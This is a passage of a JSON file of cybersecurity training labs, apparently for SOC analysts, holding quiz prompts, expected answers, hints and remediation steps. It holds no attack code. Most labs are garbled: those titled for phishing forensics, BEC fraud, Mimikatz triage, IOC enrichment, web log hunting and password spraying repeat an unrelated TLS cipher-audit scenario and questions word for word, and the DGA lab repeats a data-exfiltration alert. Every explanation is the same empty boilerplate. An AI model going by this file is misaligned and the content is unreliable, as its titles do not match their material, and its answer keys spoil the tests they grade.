        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-soc-004",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "SOC Alert Fatigue Reduction & True Positive Confidence Scoring",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Tactical Security Operations Center (SOC) sensors flagged a high-severity alert. Analyze the log stream, isolate malicious indicators of compromise (IOCs), and write detection logic.",
    "telemetry": "index=firewall action=allowed dest_port=443\n| stats count by src_ip, dest_ip, bytes_out\n| where bytes_out > 500000000\nAlert: Endpoint 10.0.10.45 uploaded 512MB to 198.51.100.88 over TLS.\nEDR Correlation: Process PID 1892 (powershell.exe) established connection. Parent PID: 402 (excel.exe).",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What source IP address was responsible for the high-volume outbound data transfer?",
        "expected": "10.0.10.45",
        "acceptedKeywords": [
          "10.0.10.45"
        ],
        "hint": "src_ip in the query output.",
        "explanation": "Expected: 10.0.10.45. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What external destination IP address received the 512MB transmission?",
        "expected": "198.51.100.88",
        "acceptedKeywords": [
          "198.51.100.88"
        ],
        "hint": "dest_ip field.",
        "explanation": "Expected: 198.51.100.88. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What parent process executed powershell.exe according to EDR correlation?",
        "expected": "excel.exe",
        "acceptedKeywords": [
          "excel.exe",
          "Microsoft Excel"
        ],
        "hint": "Parent image indicating a macro attack.",
        "explanation": "Expected: excel.exe. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What port was used for the egress connection?",
        "expected": "443",
        "acceptedKeywords": [
          "443",
          "HTTPS",
          "TCP 443"
        ],
        "hint": "Standard TLS web port.",
        "explanation": "Expected: 443. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. In SIEM architecture, what tier collects, parses, and normalizes raw log data?",
        "expected": "Log Ingestion / Parser",
        "acceptedKeywords": [
          "Log Ingestion",
          "Forwarder",
          "Parser",
          "Ingestion"
        ],
        "hint": "First stage of the SIEM pipeline.",
        "explanation": "Expected: Log Ingestion / Parser. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What metric in SOC operations measures the average time elapsed between alert detection and threat containment?",
        "expected": "MTTR",
        "acceptedKeywords": [
          "MTTR",
          "Mean Time To Respond",
          "Mean Time To Remediate"
        ],
        "hint": "Mean Time to Respond / Remediate.",
        "explanation": "Expected: MTTR. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Isolate host 10.0.10.45 immediately via EDR, terminate PID 1892, block external IP 198.51.100.88 on perimeter firewalls, and initiate incident response triage."
  },
  {
    "id": "lab-soc-005",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Correlating EDR Endpoint Alerts with Perimeter Firewall Outbound Bursts",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-soc-006",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Phishing Email Header Forensics: SPF, DKIM & DMARC Failure Triage",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-soc-007",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Business Email Compromise (BEC) Wire Transfer Routing Fraud",
    "difficulty": "Intermediate",
    "timeEst": "15 min",
    "xpReward": 150,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-soc-008",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Windows Defender Alert Triage: Mimikatz Memory Artifacts Quarantined",
    "difficulty": "Beginner",
    "timeEst": "12 min",
    "xpReward": 130,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-soc-009",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Threat Intelligence IOC Enrichment via AlienVault OTX & VirusTotal",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 140,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-soc-010",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Zeek / Bro Network Logs: High Entropy Domain Resolution (DGA)",
    "difficulty": "Intermediate",
    "timeEst": "18 min",
    "xpReward": 180,
    "briefing": "Tactical Security Operations Center (SOC) sensors flagged a high-severity alert. Analyze the log stream, isolate malicious indicators of compromise (IOCs), and write detection logic.",
    "telemetry": "index=firewall action=allowed dest_port=443\n| stats count by src_ip, dest_ip, bytes_out\n| where bytes_out > 500000000\nAlert: Endpoint 10.0.10.45 uploaded 512MB to 198.51.100.88 over TLS.\nEDR Correlation: Process PID 1892 (powershell.exe) established connection. Parent PID: 402 (excel.exe).",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What source IP address was responsible for the high-volume outbound data transfer?",
        "expected": "10.0.10.45",
        "acceptedKeywords": [
          "10.0.10.45"
        ],
        "hint": "src_ip in the query output.",
        "explanation": "Expected: 10.0.10.45. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What external destination IP address received the 512MB transmission?",
        "expected": "198.51.100.88",
        "acceptedKeywords": [
          "198.51.100.88"
        ],
        "hint": "dest_ip field.",
        "explanation": "Expected: 198.51.100.88. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What parent process executed powershell.exe according to EDR correlation?",
        "expected": "excel.exe",
        "acceptedKeywords": [
          "excel.exe",
          "Microsoft Excel"
        ],
        "hint": "Parent image indicating a macro attack.",
        "explanation": "Expected: excel.exe. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What port was used for the egress connection?",
        "expected": "443",
        "acceptedKeywords": [
          "443",
          "HTTPS",
          "TCP 443"
        ],
        "hint": "Standard TLS web port.",
        "explanation": "Expected: 443. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. In SIEM architecture, what tier collects, parses, and normalizes raw log data?",
        "expected": "Log Ingestion / Parser",
        "acceptedKeywords": [
          "Log Ingestion",
          "Forwarder",
          "Parser",
          "Ingestion"
        ],
        "hint": "First stage of the SIEM pipeline.",
        "explanation": "Expected: Log Ingestion / Parser. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What metric in SOC operations measures the average time elapsed between alert detection and threat containment?",
        "expected": "MTTR",
        "acceptedKeywords": [
          "MTTR",
          "Mean Time To Respond",
          "Mean Time To Remediate"
        ],
        "hint": "Mean Time to Respond / Remediate.",
        "explanation": "Expected: MTTR. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Isolate host 10.0.10.45 immediately via EDR, terminate PID 1892, block external IP 198.51.100.88 on perimeter firewalls, and initiate incident response triage."
  },
  {
    "id": "lab-soc-011",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Apache & Nginx Web Server Access Log Attack Vector Hunting",
    "difficulty": "Beginner",
    "timeEst": "14 min",
    "xpReward": 130,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
        "explanation": "Expected: GCM. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t5",
        "prompt": "5. Which protocol versions prior to TLS 1.2 should be disabled immediately on all servers?",
        "expected": "SSLv3, TLS 1.0, TLS 1.1",
        "acceptedKeywords": [
          "SSLv3",
          "TLS 1.0",
          "TLS 1.1",
          "SSL"
        ],
        "hint": "Legacy insecure SSL and early TLS versions.",
        "explanation": "Expected: SSLv3, TLS 1.0, TLS 1.1. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t6",
        "prompt": "6. What cryptographic property ensures compromised server private keys cannot decrypt past sessions?",
        "expected": "Forward Secrecy",
        "acceptedKeywords": [
          "Forward Secrecy",
          "Perfect Forward Secrecy",
          "PFS"
        ],
        "hint": "Perfect Forward Secrecy (PFS) provided by ECDHE.",
        "explanation": "Expected: Forward Secrecy. Concept: Verified through industry security standards and real-world triage methodologies."
      }
    ],
    "remediationGuide": "Disable SSLv3, TLS 1.0, and TLS 1.1; enforce TLS 1.2 and TLS 1.3 only; disable legacy ciphers (RC4, 3DES, CBC); and deploy 3072-bit or ECC certificates."
  },
  {
    "id": "lab-soc-012",
    "category": "SOC Triage, SIEM & Log Analysis",
    "title": "Active Directory Mass Account Lockout Storm & Password Spray Hunt",
    "difficulty": "Intermediate",
    "timeEst": "16 min",
    "xpReward": 160,
    "briefing": "Security engineers audited cryptographic protocols and hashing implementations across internal defense portals. Analyze cipher suites, key lengths, and attack resistance.",
    "telemetry": "Audit Target: legacy-vpn.tactical.mil:443\nSupported Cipher Suites:\n  - TLS_RSA_WITH_RC4_128_MD5 (INSECURE / BROKEN!)\n  - TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32 VULNERABLE!)\n  - TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (SECURE)\nProtocols Enabled: SSLv3, TLS 1.0, TLS 1.1, TLS 1.2\nCertificate: RSA 1024 bits (WEAK KEY LENGTH!)",
    "tasks": [
      {
        "id": "t1",
        "prompt": "1. What legacy symmetric stream cipher (RC4) listed in the first suite is cryptographically broken?",
        "expected": "RC4",
        "acceptedKeywords": [
          "RC4",
          "Rivest Cipher 4"
        ],
        "hint": "Stream cipher vulnerable to bias attacks.",
        "explanation": "Expected: RC4. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t2",
        "prompt": "2. What birthday attack (Sweet32) exploits 64-bit block ciphers like 3DES?",
        "expected": "Sweet32",
        "acceptedKeywords": [
          "Sweet32",
          "sweet32"
        ],
        "hint": "CVE-2016-2183 attack name.",
        "explanation": "Expected: Sweet32. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t3",
        "prompt": "3. What is the minimum recommended RSA public key length (in bits) according to NIST standards?",
        "expected": "2048",
        "acceptedKeywords": [
          "2048",
          "2048 bits",
          "2048-bit",
          "3072"
        ],
        "hint": "Current minimum key length standard.",
        "explanation": "Expected: 2048. Concept: Verified through industry security standards and real-world triage methodologies."
      },
      {
        "id": "t4",
        "prompt": "4. What modern authenticated encryption mode (AEAD) is utilized by the secure AES-256 suite?",
        "expected": "GCM",
        "acceptedKeywords": [
          "GCM",
          "Galois/Counter Mode"
        ],
        "hint": "Galois/Counter Mode.",
